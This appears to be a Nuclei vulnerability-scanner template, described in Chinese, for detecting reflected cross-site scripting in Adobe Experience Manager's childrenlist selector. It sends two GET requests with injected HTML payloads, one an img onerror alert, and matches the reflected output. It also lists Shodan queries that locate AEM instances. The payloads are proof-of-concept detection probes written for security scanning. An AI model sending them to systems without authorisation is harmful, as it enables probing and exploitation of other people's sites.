id: aem-xss-childlist

info:
  name: Adobe Experience Manager Childlist Selector Cross Site Scripting 检测
  author: theabhinavgaur
  severity: medium
  description: |
    该模板用于核查 Adobe Experience Manager Childlist Selector Cross Site Scripting相关配置。该类问题通常源于配置页面、错误页或管理接口将用户可控输入未编码写入响应，导致浏览器执行非预期脚本。模板会向目标发送探测请求，并依据请求 `/{{rand_base(4)}}<img src=x data'a'onerror=alert(domain)>.childrenlist.html`、`/{{rand_base(4)}}<br><br>please%20authenticate<br><br>.childrenlist.html`、匹配 `<img src="x" data onerror="alert(domain)"/>`、`<br /><br />please authenticate<br /><br />`、状态码 200 等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可诱导用户访问构造链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作或辅助钓鱼。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
    cpe: cpe:2.3:a:adobe:experience_manager:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    shodan-query:
      - http.title:"AEM Sign In"
      - http.component:"Adobe Experience Manager"
    product: experience_manager
    vendor: adobe
  tags: xss,aem,adobe,misconfig,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/{{rand_base(4)}}<img src=x data'a'onerror=alert(domain)>.childrenlist.html"
      - "{{BaseURL}}/{{rand_base(4)}}<br><br>please%20authenticate<br><br>.childrenlist.html"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<img src="x" data onerror="alert(domain)"/>'
          - '<br /><br />please authenticate<br /><br />'
        condition: or

      - type: word
        part: body
        words:
          - 'data-coral-columnview-id'

      - type: word
        part: content_type
        words:
          - 'text/html'

      - type: status
        status:
          - 200
